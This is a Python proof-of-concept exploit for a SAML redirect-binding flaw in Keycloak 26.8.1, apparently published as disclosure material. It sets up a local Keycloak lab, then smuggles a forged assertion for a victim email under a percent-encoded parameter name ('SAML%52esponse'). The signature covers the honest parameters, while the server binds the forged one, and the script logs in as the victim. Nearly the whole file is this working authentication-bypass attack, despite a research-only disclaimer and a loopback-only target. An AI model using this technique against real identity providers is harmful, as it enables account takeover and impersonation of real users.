#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: keycloak-saml-redirect-param-split (High: 7.4)
#  Vendor: Keycloak (Red Hat)
#  Versions: Keycloak 26.8.1
#  Impact: percent-encoded SAML query name split: signature verifies the honest params, RESTEasy binds the forged SAMLResponse
#  Requires: redirect-signing SAML broker with validateSignature true and wantAssertionsSigned absent or false; no Keycloak account
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "keycloak-saml-redirect-param-split"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Mail", _EMAIL),):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs"
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Keycloak 26.8.1 SAML redirect: percent-decoded query name vs raw signature bytes."""

import base64
import html
import json
import re
import subprocess
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET
import zlib
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.x509.oid import NameOID

LABEL = "KC-H04-SAML-REDIRECT"
WITNESS = "kcs04b8n1"
IMAGE = "quay.io/keycloak/keycloak:26.8.1"
PIN = "26.8.1"
HOST = "127.0.0.1"
PORT = 18084
BASE = f"http://{HOST}:{PORT}"
HERE = Path(__file__).resolve().parent
REALM = "lab"
CLIENT = "lab-app"
IDP = "upstream"
IDP_ENTITY = "https://idp.lab/saml"
CALLBACK = f"{BASE}/lab-app/callback"
ATTACKER_EMAIL = f"attacker.{WITNESS}@lab.test"
VICTIM_EMAIL = f"victim.{WITNESS}@lab.test"
SIGALG = "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"
BOOT_USER = "admin"
BOOT_PASS = "bootstrap-pass"
# Query-name decoder maps this onto SAMLResponse. Raw signature lookup does not.
FORGED_NAME = "SAML%52esponse"


class ApiError(Exception):
    def __init__(self, reason: str) -> None:
        super().__init__(reason)
        self.reason = reason


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    """Keycloak sets the auth-session cookie on the 302. Do not drop it."""

    def redirect_request(
        self,
        req: urllib.request.Request,
        fp: Any,
        code: int,
        msg: str,
        headers: Any,
        newurl: str,
    ) -> None:
        raise urllib.error.HTTPError(req.full_url, code, msg, headers, fp)


_OPENER = urllib.request.build_opener(_NoRedirect)


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    location: str
    set_cookies: tuple[str, ...]


@dataclass
class Jar:
    cookies: dict[str, str]

    def add(self, raw_headers: tuple[str, ...]) -> None:
        for raw in raw_headers:
            pair = raw.split(";", 1)[0]
            if "=" not in pair:
                continue
            name, value = pair.split("=", 1)
            self.cookies[name.strip()] = value.strip()

    def header(self) -> str:
        return "; ".join(f"{name}={value}" for name, value in self.cookies.items())


def request(
    method: str,
    url: str,
    *,
    headers: dict[str, str] | None = None,
    data: bytes | None = None,
    jar: Jar | None = None,
    timeout: int = 60,
) -> HttpResult:
    hdrs = dict(headers or {})
    if jar is not None and jar.cookies:
        hdrs["Cookie"] = jar.header()
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with _OPENER.open(req, timeout=timeout) as resp:
            result = _result(resp.status, resp.read(), resp.headers)
    except urllib.error.HTTPError as exc:
        result = _result(exc.code, exc.read(), exc.headers)
    except urllib.error.URLError as exc:
        raise ApiError("unreachable") from exc
    if jar is not None:
        jar.add(result.set_cookies)
    return result


def _result(status: int, raw: bytes, headers: Any) -> HttpResult:
    values = headers.get_all("Set-Cookie") if hasattr(headers, "get_all") else None
    location = ""
    getter = getattr(headers, "get", None)
    if callable(getter):
        location = str(getter("Location") or "")
    return HttpResult(
        status,
        raw.decode("utf-8", errors="replace"),
        location,
        tuple(values or ()),
    )


def java_urlencode(value: str) -> str:
    """Match Java URLEncoder: keep -._* and encode space as plus."""
    return urllib.parse.quote(value, safe="-._*").replace("%20", "+")


def deflate_raw(payload: bytes) -> bytes:
    engine = zlib.compressobj(zlib.Z_DEFAULT_COMPRESSION, zlib.DEFLATED, -15)
    return engine.compress(payload) + engine.flush()


def b64_deflate(xml: str) -> str:
    return base64.b64encode(deflate_raw(xml.encode("utf-8"))).decode("ascii")


def inflate_redirect(raw_value: str) -> bytes:
    decoded = urllib.parse.unquote_plus(raw_value)
    return zlib.decompress(base64.b64decode(decoded), -15)


def snippet(body: str) -> str:
    text = re.sub(r"<[^>]+>", " ", body or "")
    text = re.sub(r"\s+", " ", text).strip()
    return text[:160]


def error_text(body: str) -> str:
    for pattern in (
        r'class="instruction"[^>]*>([^<]+)',
        r'kc-feedback-text[^>]*>([^<]+)',
        r'id="kc-error-message"[\s\S]{0,400}?<(?:p|span)[^>]*>([^<]+)',
    ):
        match = re.search(pattern, body or "", flags=re.IGNORECASE)
        if match:
            return re.sub(r"\s+", " ", match.group(1)).strip()[:200]
    return snippet(body)


def on_lab(url: str) -> bool:
    parsed = urllib.parse.urlparse(url)
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    return parsed.scheme == "http" and parsed.hostname == HOST and port == PORT


def raw_query_pairs(url: str) -> list[tuple[str, str]]:
    parsed = urllib.parse.urlparse(url)
    pairs: list[tuple[str, str]] = []
    for part in parsed.query.split("&"):
        if not part:
            continue
        if "=" in part:
            name, value = part.split("=", 1)
        else:
            name, value = part, ""
        pairs.append((name, value))
    return pairs


def raw_param(url: str, name: str) -> str:
    for key, value in raw_query_pairs(url):
        if key == name:
            return value
    return ""


def local_name(tag: str) -> str:
    return tag.rsplit("}", 1)[-1]


def image_version() -> str:
    proc = subprocess.run(
        [
            "docker",
            "image",
            "inspect",
            IMAGE,
            "--format",
            '{{ index .Config.Labels "version" }}',
        ],
        check=False,
        capture_output=True,
        text=True,
    )
    return (proc.stdout or "").strip()


def api(
    method: str,
    path: str,
    token: str,
    body: dict[str, Any] | None = None,
) -> HttpResult:
    data = None if body is None else json.dumps(body).encode("utf-8")
    headers = {"Authorization": f"Bearer {token}", "Accept": "application/json"}
    if data is not None:
        headers["Content-Type"] = "application/json"
    return request(method, f"{BASE}{path}", headers=headers, data=data)


def expect(result: HttpResult, statuses: set[int], what: str) -> Any:
    if result.status not in statuses:
        raise ApiError(f"{what}-{result.status}-{snippet(result.body)[:80]}")
    if not result.body:
        return None
    return json.loads(result.body)


def password_token() -> str:
    form = urllib.parse.urlencode(
        {
            "grant_type": "password",
            "client_id": "admin-cli",
            "username": BOOT_USER,
            "password": BOOT_PASS,
        }
    ).encode("utf-8")
    result = request(
        "POST",
        f"{BASE}/realms/master/protocol/openid-connect/token",
        data=form,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    payload = expect(result, {200}, "admin-token")
    if not isinstance(payload, dict) or not payload.get("access_token"):
        raise ApiError("admin-token-missing")
    return str(payload["access_token"])


def signing_material() -> tuple[rsa.RSAPrivateKey, str]:
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "idp.lab")])
    now = datetime.now(timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - timedelta(days=1))
        .not_valid_after(now + timedelta(days=2))
        .sign(key, hashes.SHA256())
    )
    der = base64.b64encode(cert.public_bytes(serialization.Encoding.DER)).decode("ascii")
    wrapped = "\n".join(der[index : index + 64] for index in range(0, len(der), 64))
    return key, wrapped


def saml_time(moment: datetime) -> str:
    return moment.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000Z")


def xml_escape(value: str) -> str:
    return (
        value.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
    )


def assertion_xml(email: str, request_id: str, audience: str, acs: str) -> str:
    now = datetime.now(timezone.utc)
    issued = saml_time(now)
    early = saml_time(now - timedelta(seconds=30))
    late = saml_time(now + timedelta(minutes=5))
    response_id = "_r" + base64.b16encode(now.microsecond.to_bytes(4, "big")).decode("ascii").lower()
    assertion_id = "_a" + email.split("@", 1)[0].replace(".", "")
    safe_email = xml_escape(email)
    return (
        "<samlp:Response"
        ' xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"'
        ' xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"'
        f' ID="{response_id}" Version="2.0" IssueInstant="{issued}"'
        f' Destination="{xml_escape(acs)}" InResponseTo="{xml_escape(request_id)}">'
        f"<saml:Issuer>{IDP_ENTITY}</saml:Issuer>"
        "<samlp:Status><samlp:StatusCode"
        ' Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>'
        f'<saml:Assertion ID="{assertion_id}" Version="2.0" IssueInstant="{issued}">'
        f"<saml:Issuer>{IDP_ENTITY}</saml:Issuer>"
        "<saml:Subject>"
        '<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">'
        f"{safe_email}</saml:NameID>"
        '<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">'
        "<saml:SubjectConfirmationData"
        f' InResponseTo="{xml_escape(request_id)}" Recipient="{xml_escape(acs)}"'
        f' NotOnOrAfter="{late}"/></saml:SubjectConfirmation></saml:Subject>'
        f'<saml:Conditions NotBefore="{early}" NotOnOrAfter="{late}">'
        "<saml:AudienceRestriction><saml:Audience>"
        f"{xml_escape(audience)}</saml:Audience></saml:AudienceRestriction>"
        "</saml:Conditions>"
        f'<saml:AuthnStatement AuthnInstant="{issued}" SessionIndex="{assertion_id}">'
        "<saml:AuthnContext><saml:AuthnContextClassRef>"
        "urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified"
        "</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement>"
        '<saml:AttributeStatement><saml:Attribute Name="email">'
        f"<saml:AttributeValue>{safe_email}</saml:AttributeValue></saml:Attribute>"
        "</saml:AttributeStatement></saml:Assertion></samlp:Response>"
    )


def signed_query(key: rsa.RSAPrivateKey, xml: str, relay_raw: str) -> str:
    encoded = java_urlencode(b64_deflate(xml))
    sigalg = java_urlencode(SIGALG)
    raw = f"SAMLResponse={encoded}&RelayState={relay_raw}&SigAlg={sigalg}"
    signature = key.sign(raw.encode("utf-8"), padding.PKCS1v15(), hashes.SHA256())
    sig = java_urlencode(base64.b64encode(signature).decode("ascii"))
    return f"{raw}&Signature={sig}"


def parse_authn(location: str) -> tuple[str, str, str]:
    encoded = raw_param(location, "SAMLRequest")
    if not encoded:
        raise ApiError("samlrequest-missing")
    root = ET.fromstring(inflate_redirect(encoded))
    request_id = root.attrib.get("ID") or ""
    acs = root.attrib.get("AssertionConsumerServiceURL") or ""
    issuer = ""
    for element in root.iter():
        if local_name(element.tag) == "Issuer" and (element.text or "").strip():
            issuer = element.text.strip()
            break
    if not request_id or not acs or not issuer:
        raise ApiError("authn-fields-missing")
    return request_id, issuer, acs


def follow(jar: Jar, url: str, trace: list[str]) -> tuple[HttpResult, str]:
    current = url
    last = HttpResult(0, "", "", ())
    for index in range(16):
        last = request("GET", current, jar=jar)
        loc_path = urllib.parse.urlparse(last.location).path if last.location else "-"
        trace.append(f"{index}:{last.status}:{urllib.parse.urlparse(current).path}:{loc_path}")
        if last.status not in {301, 302, 303, 307, 308} or not last.location:
            return last, current
        nxt = urllib.parse.urljoin(current, last.location)
        if nxt.startswith(CALLBACK) and "code=" in urllib.parse.urlparse(nxt).query:
            return HttpResult(last.status, last.body, nxt, last.set_cookies), current
        if not on_lab(nxt):
            return HttpResult(last.status, last.body, nxt, last.set_cookies), current
        current = nxt
    return last, current


def jwt_email(access: str) -> str:
    parts = access.split(".")
    if len(parts) < 2:
        return ""
    padded = parts[1] + "=" * (-len(parts[1]) % 4)
    try:
        payload = json.loads(base64.urlsafe_b64decode(padded))
    except (ValueError, json.JSONDecodeError):
        return ""
    if not isinstance(payload, dict):
        return ""
    return str(payload.get("email") or "")


def exchange(code: str) -> str:
    form = urllib.parse.urlencode(
        {
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": CALLBACK,
            "client_id": CLIENT,
        }
    ).encode("utf-8")
    result = request(
        "POST",
        f"{BASE}/realms/{REALM}/protocol/openid-connect/token",
        data=form,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    payload = expect(result, {200}, "token")
    if not isinstance(payload, dict):
        raise ApiError("token-shape")
    access = str(payload.get("access_token") or "")
    email = jwt_email(access)
    if email:
        return email
    info = request(
        "GET",
        f"{BASE}/realms/{REALM}/protocol/openid-connect/userinfo",
        headers={"Authorization": f"Bearer {access}"},
    )
    body = expect(info, {200}, "userinfo")
    if not isinstance(body, dict):
        raise ApiError("userinfo-shape")
    return str(body.get("email") or "")


def user_count(token: str, email: str) -> int:
    query = urllib.parse.urlencode({"email": email, "exact": "true"})
    result = api("GET", f"/admin/realms/{REALM}/users?{query}", token)
    rows = expect(result, {200}, "user-search")
    if not isinstance(rows, list):
        raise ApiError("user-search-shape")
    return len(rows)


def field_value(body: str, field: str) -> str:
    match = re.search(rf'name="{re.escape(field)}"[^>]*value="([^"]*)"', body)
    if match is None:
        return ""
    return html.unescape(match.group(1))


def submit_profile(jar: Jar, hop: HttpResult, trace: list[str]) -> tuple[HttpResult, str]:
    """Default profile requires a first and last name. Keep the brokered email."""
    match = re.search(r'id="kc-update-profile-form"[^>]*action="([^"]+)"', hop.body)
    if match is None:
        return hop, ""
    action = html.unescape(match.group(1))
    if not on_lab(action):
        raise ApiError("profile-off-loopback")
    email = field_value(hop.body, "email")
    if not email:
        raise ApiError("profile-email-missing")
    form = urllib.parse.urlencode(
        {"email": email, "firstName": "Lab", "lastName": "User"}
    ).encode("utf-8")
    posted = request(
        "POST",
        action,
        jar=jar,
        data=form,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    trace.append(f"profile:{posted.status}")
    if posted.status not in {301, 302, 303, 307, 308} or not posted.location:
        return posted, action
    nxt = urllib.parse.urljoin(action, posted.location)
    if nxt.startswith(CALLBACK) and "code=" in urllib.parse.urlparse(nxt).query:
        return HttpResult(posted.status, posted.body, nxt, posted.set_cookies), action
    if not on_lab(nxt):
        raise ApiError("profile-redirect-off-loopback")
    return follow(jar, nxt, trace)


def code_from(url: str) -> str:
    values = urllib.parse.parse_qs(urllib.parse.urlparse(url).query).get("code") or []
    return values[0] if values else ""


def hop_note(note: Any, tag: str, hop: HttpResult, requested: str, trace: list[str]) -> None:
    path = urllib.parse.urlparse(requested).path or "-"
    loc = urllib.parse.urlparse(hop.location).path if hop.location else "-"
    note(f"IOC {tag}-status={hop.status} path={path} location-path={loc} trace={'>'.join(trace) or '-'}")
    note(f"IOC {tag}-error={error_text(hop.body) or '-'}")
    (HERE / "last-hop.html").write_text(hop.body or "", encoding="utf-8")


def broker_email(
    note: Any,
    token: str,
    key: rsa.RSAPrivateKey,
    *,
    forged: bool,
) -> str:
    tag = "attack" if forged else "control"
    jar = Jar(cookies={})
    auth = (
        f"{BASE}/realms/{REALM}/protocol/openid-connect/auth"
        f"?client_id={CLIENT}"
        f"&redirect_uri={urllib.parse.quote(CALLBACK, safe='')}"
        "&response_type=code&scope=openid%20email"
        f"&state={tag}&kc_idp_hint={IDP}"
    )
    trace: list[str] = []
    hop, requested = follow(jar, auth, trace)
    if not hop.location or on_lab(hop.location):
        hop_note(note, f"{tag}-idp", hop, requested, trace)
        raise ApiError(f"{tag}-idp-hop")
    note(f"IOC {tag}-idp-port={urllib.parse.urlparse(hop.location).port}")
    request_id, issuer, acs = parse_authn(hop.location)
    relay = raw_param(hop.location, "RelayState")
    if not relay:
        raise ApiError(f"{tag}-relay-missing")
    if not acs.startswith(f"{BASE}/"):
        raise ApiError(f"{tag}-acs-off-loopback")
    signed = signed_query(key, assertion_xml(ATTACKER_EMAIL, request_id, issuer, acs), relay)
    if forged:
        count = user_count(token, VICTIM_EMAIL)
        note(f"IOC victim-before={count}")
        if count != 0:
            raise ApiError("victim-already-present")
        encoded = java_urlencode(b64_deflate(assertion_xml(VICTIM_EMAIL, request_id, issuer, acs)))
        query = f"{FORGED_NAME}={encoded}&{signed}"
    else:
        query = signed
    note(f"IOC {tag}-query-bytes={len(query)}")
    done_trace: list[str] = []
    done, requested = follow(jar, f"{acs}?{query}", done_trace)
    if done.status == 200 and 'id="kc-update-profile-form"' in done.body:
        note(f"IOC {tag}-profile=submit")
        done, requested = submit_profile(jar, done, done_trace)
    if not done.location.startswith(CALLBACK):
        hop_note(note, tag, done, requested, done_trace)
        raise ApiError(f"{tag}-no-code")
    code = code_from(done.location)
    if not code:
        raise ApiError(f"{tag}-code-missing")
    return exchange(code)


def finish(lines: list[str], last: str) -> int:
    print(last, flush=True)
    lines.append(last)
    (HERE / "poc-last-run.txt").write_text("\n".join(lines) + "\n", encoding="utf-8")
    return 0 if last.startswith("SUCCESS ") else 1


def main() -> int:
    lines: list[str] = []

    def note(msg: str) -> None:
        print(msg, flush=True)
        lines.append(msg)

    try:
        label_version = image_version()
        note(f"IOC image={IMAGE} label-version={label_version or 'missing'}")
        if PIN not in label_version:
            return finish(lines, f"FAIL {LABEL} image-label {WITNESS}")

        admin = password_token()
        info = expect(api("GET", "/admin/serverinfo", admin), {200}, "serverinfo")
        version = ""
        if isinstance(info, dict) and isinstance(info.get("systemInfo"), dict):
            version = str(info["systemInfo"].get("version") or "")
        note(f"IOC serverinfo-version={version or 'missing'}")
        if PIN not in version:
            return finish(lines, f"FAIL {LABEL} server-version {WITNESS}")

        expect(
            api("POST", "/admin/realms", admin, {"realm": REALM, "enabled": True, "sslRequired": "none"}),
            {201},
            "realm",
        )
        expect(
            api(
                "POST",
                f"/admin/realms/{REALM}/clients",
                admin,
                {
                    "clientId": CLIENT,
                    "protocol": "openid-connect",
                    "publicClient": True,
                    "standardFlowEnabled": True,
                    "directAccessGrantsEnabled": False,
                    "redirectUris": [CALLBACK],
                    "webOrigins": [BASE],
                },
            ),
            {201},
            "client",
        )
        key, cert_body = signing_material()
        expect(
            api(
                "POST",
                f"/admin/realms/{REALM}/identity-provider/instances",
                admin,
                {
                    "alias": IDP,
                    "providerId": "saml",
                    "enabled": True,
                    "trustEmail": True,
                    "firstBrokerLoginFlowAlias": "first broker login",
                    "config": {
                        "idpEntityId": IDP_ENTITY,
                        "singleSignOnServiceUrl": "http://127.0.0.1:9/unused",
                        "nameIDPolicyFormat": "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress",
                        "principalType": "SUBJECT",
                        "signatureAlgorithm": "RSA_SHA256",
                        "validateSignature": "true",
                        "signingCertificate": cert_body,
                        "postBindingResponse": "false",
                        "postBindingAuthnRequest": "false",
                        "postBindingLogout": "false",
                        "wantAuthnRequestsSigned": "false",
                        "allowedClockSkew": "60",
                        "syncMode": "IMPORT",
                    },
                },
            ),
            {201},
            "idp",
        )
        stored = expect(api("GET", f"/admin/realms/{REALM}/identity-provider/instances/{IDP}", admin), {200}, "idp-get")
        config = stored.get("config") if isinstance(stored, dict) else None
        if not isinstance(config, dict):
            raise ApiError("idp-config-missing")
        want = config.get("wantAssertionsSigned", "absent")
        note(f"IOC validate-signature={config.get('validateSignature')} want-assertions-signed={want}")
        if config.get("validateSignature") != "true" or want == "true":
            return finish(lines, f"FAIL {LABEL} idp-flags {WITNESS}")

        flow = urllib.parse.quote("first broker login")
        exec_path = f"/admin/realms/{REALM}/authentication/flows/{flow}/executions"
        rows = expect(api("GET", exec_path, admin), {200}, "executions")
        review_id = ""
        if isinstance(rows, list):
            for row in rows:
                if isinstance(row, dict) and row.get("providerId") == "idp-review-profile":
                    review_id = str(row.get("id") or "")
                    break
        if not review_id:
            raise ApiError("review-profile-missing")
        expect(
            api("PUT", exec_path, admin, {"id": review_id, "requirement": "DISABLED"}),
            {200, 202, 204},
            "review-put",
        )
        rows = expect(api("GET", exec_path, admin), {200}, "executions-again")
        requirement = "missing"
        if isinstance(rows, list):
            for row in rows:
                if isinstance(row, dict) and row.get("providerId") == "idp-review-profile":
                    requirement = str(row.get("requirement") or "")
        note(f"IOC review-profile={requirement}")
        if requirement != "DISABLED":
            return finish(lines, f"FAIL {LABEL} review-profile {WITNESS}")

        control_email = broker_email(note, admin, key, forged=False)
        note(f"IOC control-email={control_email or 'missing'}")
        if control_email != ATTACKER_EMAIL:
            return finish(lines, f"FAIL {LABEL} control-email {WITNESS}")

        attack_email = broker_email(note, admin, key, forged=True)
        note(f"IOC attack-email={attack_email or 'missing'}")
        after = user_count(admin, VICTIM_EMAIL)
        note(f"IOC victim-after={after}")
        if attack_email != VICTIM_EMAIL or after != 1:
            return finish(lines, f"FAIL {LABEL} attack-email {WITNESS}")
        return finish(lines, f"SUCCESS {LABEL} {WITNESS}")
    except ApiError as exc:
        return finish(lines, f"FAIL {LABEL} {exc.reason} {WITNESS}")
    except Exception as exc:
        return finish(lines, f"FAIL {LABEL} {type(exc).__name__} {WITNESS}")


if __name__ == "__main__":
    raise SystemExit(main())

